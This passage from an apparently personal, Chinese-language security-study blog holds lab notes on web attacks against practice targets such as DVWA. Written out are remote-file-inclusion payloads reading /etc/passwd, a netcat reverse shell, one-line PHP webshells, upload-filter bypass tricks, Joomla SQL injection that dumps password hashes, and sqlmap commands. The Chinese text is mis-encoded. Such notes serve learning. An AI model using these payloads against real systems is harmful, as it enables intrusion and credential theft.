          // chosen language must be installed to wp-includes/languages.
          // For example, install de.mo to wp-includes/languages and set WPLANG to 'de'
          // to enable German language support.
          define ('WPLANG', '');

          /* That's all, stop editing! Happy blogging. */

          define('ABSPATH', dirname(__FILE__).'/');
          require_once(ABSPATH.'wp-settings.php');

          define('RELOCATE',true);
          ?&gt;
</code></pre></div>        </div>
      </li>
      <li>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´<code class="language-plaintext highlighter-rouge">all_url_include()</code>
        <ul>
          <li>PHPä¸­å‡½æ•°system\passthru\exec\exec_onceå¯ä»¥å®ç°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>
          <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://input%00</li>
          <li>Enable Post Data: &lt;?system(â€œ/sbin/ifconfigâ€)?&gt;/&lt;?system(â€œuname -aâ€)?&gt;</li>
          <li>ä½¿ç”¨ä¼ªåè®®ç›´æ¥ç”¨getæ–¹å¼:http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php system(â€œidâ€);?&gt;%00</li>
          <li>æŠŠphpæŒ‡ä»¤ç»è¿‡base64ç¼–ç å’Œurlç¼–ç ï¼Œæ›¿æ¢åŸæ¥çš„</li>
          <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTs%2fPg%3D%3D%00</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="25-å‘½ä»¤æ³¨å…¥æ¼æ´æ”»å‡»remote-command-execution-rce">2.5 å‘½ä»¤æ³¨å…¥æ¼æ´æ”»å‡»(Remote Command Execution, RCE)</h5>
<ul>
  <li>æœåŠ¡å™¨é€šè¿‡è„šæœ¬ä»£ç åœ¨ æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™è¿‡æ»¤ä¸ä¸¥ï¼Œä»è€Œæ³¨å…¥ä¸€æ®µæ”»å‡»è€…èƒ½å¤Ÿ æ§åˆ¶çš„ä»£ç ï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šä»¥WebæœåŠ¡çš„åå°æƒé™ è¿œç¨‹æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</li>
  <li>nslookup åŠ åˆ†å·å†åŠ åˆ«çš„å‘½ä»¤å¯ä»¥è·å–linuxä¿¡æ¯ã€‚
    <ul>
      <li>ä¸€èˆ¬å¯ä»¥å®ç°è¯»å†™çš„æ–‡ä»¶
        <ul>
          <li>/tmp</li>
          <li>/sbin/ifconfig</li>
          <li>/etc/passwd</li>
          <li>/var/www</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>ncç›‘å¬ï¼Œè¿æ¥åå¼¹shell
    <ul>
      <li>nc 172.16.185.167 -nlp 443</li>
      <li>nc 172.16.185.167 443 -e /bin/sh</li>
      <li>dirtycowææƒ</li>
    </ul>
  </li>
  <li>dvwa
    <ul>
      <li>user/user</li>
      <li>æºç ä½ç½®ï¼š /var/www/dvwa/vulnerabilities/exec/source/</li>
      <li>`shell_command` æ‰§è¡Œshell_commandå‘½ä»¤</li>
      <li>$(shell_command) æ‰§è¡Œshell_commandå‘½ä»¤</li>
      <li><code class="language-plaintext highlighter-rouge">| shell_command</code> æ‰§è¡Œshell_commandå‘½ä»¤å¹¶è¿”å›ç»“æœ</li>
      <li><code class="language-plaintext highlighter-rouge">|| shell_command</code> æ‰§è¡Œshell_commandå‘½ä»¤å¹¶è¿”å›ç»“æœ</li>
      <li>; shell_command æ‰§è¡Œshell_commandå‘½ä»¤å¹¶è¿”å›ç»“æœ</li>
      <li>&amp;&amp; shell_command æ‰§è¡Œshell_commandå‘½ä»¤å¹¶è¿”å›ç»“æœ</li>
      <li><code class="language-plaintext highlighter-rouge">&gt; target_file</code> è¿”å›ç»“æœè¦†ç›–åˆ°target_fileé‡Œ</li>
      <li><code class="language-plaintext highlighter-rouge">&gt;&gt; target_file</code> è¿”å›ç»“æœè¿½åŠ åˆ°target_fileé‡Œ</li>
      <li><code class="language-plaintext highlighter-rouge">&lt; target_file</code> æŠŠtarget_fileçš„å†…å®¹è¾“å…¥åˆ°ä¹‹å‰çš„å‘½ä»¤å½“ä¸­</li>
      <li>
        <ul>
          <li>operator ç»™ç›®æ ‡æŒ‡ä»¤æ·»åŠ é¢å¤–çš„å‚æ•°</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="26-æ–‡ä»¶ä¸Šä¼ æ¼æ´æ”»å‡»">2.6 æ–‡ä»¶ä¸Šä¼ æ¼æ´æ”»å‡»</h5>
<ul>
  <li>Webshell
    <ul>
      <li>å¤§é©¬/å°é©¬</li>
      <li>æƒé™é—®é¢˜å’ŒåŠŸèƒ½é—®é¢˜</li>
      <li>kaliï¼šweevely</li>
    </ul>
  </li>
  <li>å°é©¬
    <ul>
      <li>CKnife</li>
      <li>èšå»º</li>
      <li>altman</li>
    </ul>
  </li>
  <li>CKnife
    <ul>
      <li>ctrl+l æ–‡ä»¶ç®¡ç†å™¨è¾“å…¥åœ°å€</li>
      <li>è§£å‹ckinfeï¼Œåˆ°è·¯å¾„ä¸‹ï¼Œ</li>
      <li>java -jar Cknife.jarè¿è¡Œckinfe</li>
      <li><code class="language-plaintext highlighter-rouge">@eval(_$POST('cmd'));</code>ä¸€å¥è¯æœ¨é©¬</li>
      <li>hackbarä¸­postdataä¸­è¾“å…¥cmd= echo hello;</li>
      <li>ç¬¬ä¸€é¢˜
        <ul>
          <li>ä¸Šä¼ æ–‡ä»¶è¿‡ç¨‹ä¸­ï¼Œå½“éœ€è¦æ£€éªŒæ–‡ä»¶æ ¼å¼æ—¶ï¼Œè‹¥æ˜¯å‰ç«¯æ£€éªŒï¼Œå¯ä»¥ä¿®æ”¹å®¡æŸ¥å…ƒç´ </li>
          <li>è¿˜å¯ä»¥ä¿®æ”¹æ–‡ä»¶æ ¼å¼ï¼Œä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œåœ¨æµè§ˆå™¨ä¸­ä½¿ç”¨æœ¬åœ°ä»£ç†ï¼Œä¿®æ”¹åŒ…çš„å†…å®¹ï¼Œæ”¹æ–‡ä»¶å</li>
          <li>ä¹‹åä½¿ç”¨Ckinfeè·å–æœåŠ¡å™¨ç»“æ„</li>
        </ul>
      </li>
      <li>ç¬¬äºŒé¢˜(MIMEç±»å‹éªŒè¯)
        <ul>
          <li>åœ¨burpsuiteé‡Œä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸ºimage/jpeg,ç„¶åå°±èƒ½é¿å¼€æ£€éªŒ</li>
          <li>image/jpeg</li>
        </ul>
      </li>
      <li>ç¬¬ä¸‰é¢˜ï¼ˆæ–‡ä»¶æ‰©å±•åçš„é»‘åå•éªŒè¯ï¼‰
        <ul>
          <li>strchræ‰¾ç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶</li>
          <li>strrchræ‰¾æœ€åä¸€ä¸ªç¬¦åˆæ¡ä»¶</li>
          <li>ä¿®æ”¹å¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„åç¼€ä¸ºphp3ï¼Œphp4ï¼Œphp5</li>
        </ul>
      </li>
      <li>ç¬¬å››é¢˜ æ–‡ä»¶å†…å®¹æ ¼å¼éªŒè¯
        <ul>
          <li>getimagesize($file_name);é€šè¿‡æ–‡ä»¶å¤´éƒ¨è·å¾—æ–‡ä»¶å¤§å°</li>
          <li>åœ¨æœ¨é©¬ä¸­åŠ å…¥GIF89aå³å¯ç»•è¿‡æ£€æµ‹ï¼Œè¢«æœåŠ¡å™¨åˆ¤æ–­æ˜¯gifæ–‡ä»¶</li>
          <li>æ€»ç»“ï¼šæ”¹æˆåˆæ³•ç±»å‹ã€æ”¹æˆphp3ã€æ”¹æˆåˆæ³•çš„æ–‡ä»¶å¤´</li>
        </ul>
      </li>
      <li>ç¬¬äº”é¢˜ æ–‡ä»¶æ‹“å±•åç™½åå•éªŒè¯â€“å­ç›®å½•åŠ«æŒ
        <ul>
          <li>ç¯¡æ”¹å­ç›®å½•upload/yyy.php%00/xxx.jpg	 	* åœ¨burpsuiteä¸­ä¿®æ”¹imageæ”¹æˆtiny.phpï¼Œå†æŠŠproxy-hexä¸­æ‰¾åˆ°å¹¶æŠŠphpä¹‹åçš„ä¸€ä¸ªå­—èŠ‚æ”¹ä¸º00ã€‚</li>
        </ul>
      </li>
      <li>
        <p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ”»å‡»</p>
      </li>
      <li>
        <p>ææƒå¤§æ€å™¨å·¥å…·ï¼Œä»¤ç‰Œæ”«å–æ¼æ´ pr</p>

        <ul>
          <li>ç¥å™¨ï¼šç†Ÿç»ƒæŒæ¡sqlmap,nmap,burpsuite,metaspolit,setoolkit</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="27-æ–‡ä»¶ä¸Šä¼ æ¼æ´">2.7 æ–‡ä»¶ä¸Šä¼ æ¼æ´</h5>

<p>ä¸Šä¼ æ–‡ä»¶æ”»å‡»ï¼š</p>

<h6 id="iis60è§£æaspæ¼æ´">IIS6.0è§£æASPæ¼æ´</h6>

<ol>
  <li>æœåŠ¡å™¨ä¸Šå¯æ‰§è¡Œæ–‡ä»¶åä¸º.cer.cdx.asc</li>
  <li>cerè¯ä¹¦æœ€ååŠ ä¸Šå°é©¬<code class="language-plaintext highlighter-rouge">@eval(_$POST('cmd'));</code>å®ç°ã€‚</li>
  <li>åœ¨æ–‡ä»¶å¤¹åä¸ºxxx.aspç›®å½•ä¸‹ï¼Œé‡Œé¢å¯ä»¥å®ç°ä»»æ„æ‹“å±•åçš„æ–‡ä»¶éƒ½ä¼šåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚</li>
  <li>å°é©¬çš„æ–‡ä»¶åè®¾ç½®æˆ<code class="language-plaintext highlighter-rouge">pp.asp;.jpg</code></li>
  <li>é˜²å¾¡æ–¹æ³•ï¼šæœåŠ¡å™¨ä¿å­˜æ–‡ä»¶æ—¶è‡ªå·±å®šä¹‰æ–‡ä»¶åä¿å­˜ï¼Œä¸ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥</li>
</ol>

<h6 id="nginxè§£æphpæ¼æ´">nginxè§£æphpæ¼æ´</h6>

<ol>
  <li>nginx&lt;=0.8.37,ç”¨æˆ·è®¿é—®xxx.jpg/xxx.phpæ—¶æœåŠ¡å™¨ä¼šæŠŠxxx.jpgå½“åšPHPæ–‡ä»¶è§£æ</li>
</ol>

<h6 id="ä½¿ç”¨ç½‘é¡µç¼–è¾‘å™¨ä¸­çš„æ¼æ´">ä½¿ç”¨ç½‘é¡µç¼–è¾‘å™¨ä¸­çš„æ¼æ´</h6>

<p>IIS6è§£ææ¼æ´æ”»å‡»</p>

<p>fckeditor/eitor/filemanager/upload
fckeditor/eitor/filemanager/browser/default/connectors/asp/connector.asp</p>

<ul>
  <li>tamperdataæŸ¥çœ‹æœåŠ¡å™¨ç‰ˆæœ¬å’Œç±»å‹ï¼š192.168.1.222/EditNews.html</li>
  <li>æŸ¥çœ‹fckeditorç‰ˆæœ¬ï¼š192.168.1.222/fckeditor/_whatsnew.html</li>
  <li>http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp</li>
  <li>http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp&amp;type=Image</li>
  <li>192.168.1.222/userfiles/image/fck.asp/littlec01dstudy.jpg</li>
  <li>ç›´æ¥ä¸Šä¼ littlec01dstudy.asp;.jpgæ–‡ä»¶åŒæ ·å¯ä»¥ç›´æ¥è¿è¡Œæ–‡ä»¶å†…å®¹192.168.1.222/userfiles/image/littlec01dstudy.asp;.jpg</li>
  <li>æˆ–è€…åœ¨å¦‚ä¸‹urlä¸­ä½¿ç”¨ç±»ä¼¼æ–¹æ³•
    <ul>
      <li>192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/test.html</li>
      <li>192.168.1.222/fckeditor/editor/filemanager/upload/test.html</li>
      <li>192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Com mand=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=%2F</li>
    </ul>
  </li>
</ul>

<h5 id="28-webåº”ç”¨ç»„ä»¶æ”»å‡»">2.8 Webåº”ç”¨ç»„ä»¶æ”»å‡»</h5>

<p>Kaliï¼š</p>

<ul>
  <li>whatWeb</li>
</ul>

<h6 id="webåº”ç”¨æœåŠ¡å’Œæ¡†æ¶ç»„ä»¶æ”»å‡»">Webåº”ç”¨æœåŠ¡å’Œæ¡†æ¶ç»„ä»¶æ”»å‡»</h6>

<ol>
  <li>
    <p>Joomla3.2.1</p>

    <ul>
      <li>whatweb/zoomeye/shodan.ioæœç´¢ç›¸å…³ä¿¡æ¯</li>
      <li>åœ¨exploit-db.comæ‰¾åˆ°ç›¸å…³æ¼æ´
        <ul>
          <li>192.168.10.100/index.php/weblinks-categories?id=0 ) union select password from <code class="language-plaintext highlighter-rouge">nnla5_users</code> â€“ )</li>
          <li>192.168.10.100/index.php/weblinks-categories?id=0 ) union select concat(0x5b,username,0x3a,password,0x5d) from nnla5_users limit 0,1 â€“ )</li>
          <li>192.168.10.100/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60nnla5_users%60%20â€“%20%29</li>
          <li>admin:admin123</li>
          <li>sqlmap -u â€˜http://192.168.10.100/index.php/weblinks-categories?id=0<em>â€™ â€“level=3 â€“dbs æŠŠæ³¨å…¥çš„è¯­å¥ç”¨</em>ä»£æ›¿ï¼Œä½¿ç”¨*å‘ŠçŸ¥sqlmapåœ¨è¿™é‡Œæ³¨å…¥æˆåŠŸç‡è¾ƒé«˜
            <ul>
              <li>sqlmapï¼šç›¸æ¯”level1ï¼Œlevel3æ˜¯å°è¯•æ›´å¤šçš„æ³¨å…¥</li>
              <li>sqlmap -u â€˜http://192.168.10.100/index.php/weblinks-categories?id=0*â€™ â€“level=3 â€“dbs</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <p>wordpress</p>

    <ul>
      <li>Kali:wpscan
        <ul>
          <li>ä¸»è¦ä½¿ç”¨pluginå’Œæ•°æ®åº“ç›¸å…³æŒ‡ä»¤</li>
          <li>wpscan -u http://192.168.10.116/wordpress â€“enumerate p</li>
          <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;php @eval($_POST[â€˜cmdâ€™]);//	wordpressä¸€å¥è¯æœ¨é©¬</li>
          <li>ç»•è¿‡æ–¹æ³•ï¼š<strong>RFI to get shell</strong>
            <ul>
              <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_POST[â€˜cmdâ€™]);?&gt;</li>
              <li>data:text/plain,&lt;?php @eval($_POST[â€˜cmdâ€™]);?&gt;</li>
              <li>data:text/plain,&lt;?php @eval($_POST[â€˜cmdâ€™]);//</li>
              <li>å‘ç°å¯ä»¥æ‰§è¡ŒphpinfoæŒ‡ä»¤ï¼Œ192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[â€˜cmdâ€™]);?&gt;&amp;cmd=phpinfo();</li>
              <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[â€˜cmdâ€™]);?&gt;&amp;cmd=passthru(â€˜mysql -u wordpress -pwp_pass888 -A wordpress -e â€œshow tables;â€â€™);</li>
              <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[â€˜cmdâ€™]);?&gt;&amp;cmd=passthru(â€˜mysql -u wordpress -pwp_pass888 -A wordpress -e â€œselect * from wp_users;â€â€™);</li>
              <li>passthruæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶ä¸”å›æ˜¾ï¼š-påé¢ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œè¦ç›´æ¥è¿æ¥å¯†ç ï¼›å•åŒå¼•å·ä½¿ç”¨åˆ†å¼€ï¼Œå¦åˆ™ä¼šä¸æ­£å¸¸é—­åˆ</li>
            </ul>
          </li>
          <li>sqli to get shell
            <ul>
              <li>admin:wp_@dm!n</li>
            </ul>
          </li>
          <li>æ’ä»¶å®ç°WordPressæ¸—é€ï¼šjetpack</li>
          <li>ä¸Šä¼ æ’ä»¶æ—¶åŠ å…¥ä¸€å¥è¯æœ¨é©¬</li>
          <li>ä¸Šä¼ è·¯å¾„åœ¨/wordpress/wp-content/plugins/akismet,åœ¨è¯¥è·¯å¾„ä¸‹å®ç°äº†æ¸—é€</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<h3 id="é—®é¢˜">é—®é¢˜</h3>
<ol>
  <li>SQLæ³¨å…¥æ—¶<code class="language-plaintext highlighter-rouge">select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code>
å®é™…æƒ…å†µå¦‚ä¸‹é¢çš„ä¾‹å­<code class="language-plaintext highlighter-rouge">select count(*) from TSafe group by floor(rand(0)*2);</code>
    <ul>
      <li>è¡¨ä¸­å¿…é¡»æœ‰3æ¡ä»¥ä¸Šçš„è®°å½•æ‰ä¼šæŠ¥é”™</li>
      <li>rand()å‡½æ•°çš„éšæœºå› å­è‹¥ä¸å–ï¼Œåˆ™ä¼šéšæœºæŠ¥é”™ï¼Œè®¾ä¸ºå›ºå®šå€¼å¦‚rand(0)ï¼Œå¦‚è¡¨ä¸­æœ‰3æ¡ä»¥ä¸Šæ•°æ®ï¼Œå°±ä¸€å®šæŠ¥é”™ã€‚</li>
      <li>åŸç†ï¼š
        <ul>
          <li>æ‰§è¡Œè¯¥æ¡è¯­å¥æ—¶ï¼Œå…ˆå»ºç«‹è™šè¡¨</li>
          <li>floor(rand(0)*2)çš„è¿”å›å€¼æ˜¯011011â€¦ä¸”æŸ¥è¯¢æ—¶rand()ä¼šè¢«åå¤æ‰§è¡Œï¼Œå³åœ¨æŸ¥è¯¢è¿‡ç¨‹ä¸­æ¯æ¬¡åŒ¹é…ä¼šé‡æ–°è®¡ç®—rand()çš„å€¼</li>
          <li>011011..ç¬¬ä¸€æ¬¡æŸ¥è¯¢0ï¼Œæ²¡æœ‰é‡æ–°è®¡ç®—ä¸º1ï¼Œäº§ç”Ÿç¬¬ä¸€æ¡æ•°æ®ï¼›ç¬¬äºŒæ¬¡æŸ¥è¯¢1ï¼Œæœ‰countåˆ™ç›´æ¥åŠ 1ä¸º2ï¼›ç¬¬ä¸‰æ¬¡æŸ¥è¯¢0æ²¡æœ‰é‡æ–°è®¡ç®—ä¸º1ï¼Œæ­¤æ—¶æœ‰1ä½†æ˜¯ä»è¦æ’å…¥1ï¼Œé‡å¤æŠ¥é”™ã€‚</li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong><em>[å…³é”®]</em></strong>åœ¨ä½¿ç”¨è™šæ‹Ÿæœºçš„æ—¶å€™ä¼šé‡åˆ°å†…å­˜ä¸è¶³çš„æƒ…å†µï¼Œç›´æ¥ä¿®æ”¹Vmwareé‡Œçš„ç¡¬ç›˜å¤§å°ä¼šå¯¼è‡´è™šæ‹Ÿæœºé‡å¯åæ— æ³•å¼€æœºã€‚<a href="https://codesilence.wordpress.com/2013/03/14/live-resizing-of-an-ext4-filesytem-on-linux/">è§£å†³åŠæ³•</a>æ˜¯éœ€è¦é‡æ–°åˆ’åˆ†ç¡¬ç›˜å’Œè®¾ç½®äº¤æ¢åŒºï¼Œä½¿ç”¨<code class="language-plaintext highlighter-rouge">fdisk</code>å’Œ<code class="language-plaintext highlighter-rouge">mkswap</code>ç­‰å·¥å…·å®ç°ã€‚</li>
</ol>

  </section>
<!-- <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script> -->
</article>

<section>
       <ul class="pager">
        
        <li class="previous">
            <a href="/2017/11/MongoDB/" data-toggle="tooltip" data-placement="top" title="MongoDBè‡ªå­¦ç¬”è®°">Last Blogï¼š  <span>MongoDBè‡ªå­¦ç¬”è®°</span>
            </a>
        </li>
        
        
        <li class="next">
            <a href="/2017/11/emacs%E6%80%BB%E7%BB%93/" data-toggle="tooltip" data-placement="top" title="emacsæ€»ç»“">Next Blogï¼š  <span>emacsæ€»ç»“</span>
            </a>
        </li>
        
    </ul>
</section>

<section class="post-comments">
<div id="disqus_thread"></div>
  <script type="text/javascript">
    var disqus_config = function () {
      // Here is an example,
      this.page.url = "https://c0ldstudy.github.io/2017/11/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/";
      this.page.identifier = "/2017/11/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/";
    };

    // You should be able to get the following lines of code from your Disqus admin.
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = '//c0ldstudy-github-io.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>
    Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
  </noscript>
</section>


            <section class="footer">
    <footer>
        <div class = "footer_div">
          <div clas="recordings" style="display:flex;justify-content:space-around;">
          <div class="twitter_display">
            <div class='jekyll-twitter-plugin'><a class="twitter-timeline" data-width="300" data-tweet-limit="1" href="https://twitter.com/JiacenXu?ref_src=twsrc%5Etfw">Tweets by JiacenXu</a>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</div>
          </div>
          <div class="github_chart">
            <img src="http://ghchart.rshah.org/409ba5/C0ldstudy" alt="C0ldstudy's Blue Github chart"/>
            <script type='text/javascript' id='clustrmaps' src='//cdn.clustrmaps.com/map_v2.js?cl=ffffff&w=400&t=n&d=PWaejm3rz2TG6HOtwcekX2kM9kPWz2aP6GYhuOVoNpA&co=2d78ad&cmo=3acc3a&cmn=ff5353&ct=ffffff'></script>
          </div>
        </div>
            <nav class="cover-navigation navigation--social">
            <ul class="navigation">
          
          <!-- Github -->
          <li class="navigation__item_social">
            <a href="https://github.com/c0ldstudy" title="@c0ldstudy çš„ Github" target="_blank">
              <i class='fab fa-github fa-2x'></i>
              <span class="label">Github</span>
            </a>
          </li>
          
          
          <!-- Twitter -->
          <li class="navigation__item_social">
            <a href="https://twitter.com/JiacenXu" title="@JiacenXu" target="_blank">
              <i class='fab fa-twitter fa-2x'></i>
              <span class="label">Twitter</span>
            </a>
          </li>
          

          
          <!-- LinkedIn -->
          <li class="navigation__item_social">
            <a href="https://www.linkedin.com/in/jiacen-xu-021536105/" title="@jiacen-xu-021536105" target="_blank">
              <i class='fab fa-linkedin fa-2x'></i>
              <span class="label">LinkedIn</span>
            </a>
          </li>
          
          

          <!-- RSS -->
          <li class="navigation__item_social">
            <a href="/feed.xml" rel="author" title="RSS" target="_blank">
              <i class='fa fa-rss fa-2x'></i>
              <span class="label">RSS</span>
            </a>
          </li>

          
          <!-- Email -->
          <li class="navigation__item_social">
            <a href="mailto:coldstudyxu@gmail.com" title="Contact me">
              <i class='fa fa-envelope fa-2x'></i>
              <span class="label">Email</span>
            </a>
          </li>
          
          </ul>
        </nav>
        </div>

        <div class = "footer_div_counter">
           <p class="copyright text-muted">
            Copyright &copy; Jason Xu 2022 Theme by <a href="http://c0ldstudy.github.io/">C0ldstudy</a> |
            <iframe
                style="margin-left: 2px; margin-bottom:-5px;"
                frameborder="0" scrolling="0" width="91px" height="20px"
                src="https://ghbtns.com/github-btn.html?user=c0ldstudy&repo=c0ldstudy.github.io&type=star&count=true" >
            </iframe>
            </p>
        	<div align="right">
    			<!-- <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css"> -->
          <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

          <!-- è®¿é—®ç»Ÿè®¡ -->
          <span id="busuanzi_container_site_uv" style='display:none'>
          <span id="busuanzi_value_site_uv"></span> People Visited!
          </span>
        </div>
        </div>
    </footer>
</section>

        </div>
    </div>

    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="/js/main.js"></script>

<script type="text/javascript" src="/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>




  </body>

</html>
